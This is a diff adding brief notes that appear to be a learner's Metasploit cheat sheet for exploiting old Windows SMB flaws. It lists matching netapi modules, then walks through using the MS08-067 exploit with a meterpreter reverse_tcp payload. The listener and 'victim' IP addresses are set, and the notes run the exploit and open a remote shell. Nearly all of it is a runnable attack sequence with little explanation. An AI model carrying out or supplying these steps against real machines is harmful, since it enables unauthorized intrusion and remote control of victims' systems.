@@ -1,0 +1,46 @@
+search netbios
+
+search netapi   (SMB vuln)
+
+
+
+Attack  
+
+---->    Exploit (USE)
+
+---->    Payload (SET)
+
+Matching Modules
+================
+
+   Name                                 Disclosure Date  Rank    Description
+   ----                                 ---------------  ----    -----------
+   exploit/windows/smb/ms03_049_netapi  2003-11-11       good    MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
+   exploit/windows/smb/ms06_040_netapi  2006-08-08       good    MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
+   exploit/windows/smb/ms06_070_wkssvc  2006-11-14       manual  MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
+   exploit/windows/smb/ms08_067_netapi  2008-10-28       great   MS08-067 Microsoft Server Service Relative Path Stack Corruption
+
+
+going with great Rank
+
+
+
+use exploit/windows/smb/ms08_067_netapi
+
+set payload windows/meterpreter/reverse_tcp
+
+set lhost 192.168.0.136(localIp)
+
+set rhost 192.168.0.144(remoteIP/VictimsIP)
+
+exploit
+
+
+>>> meterpreter
+
+     sysinfo 
+
+     shell
+
+
+
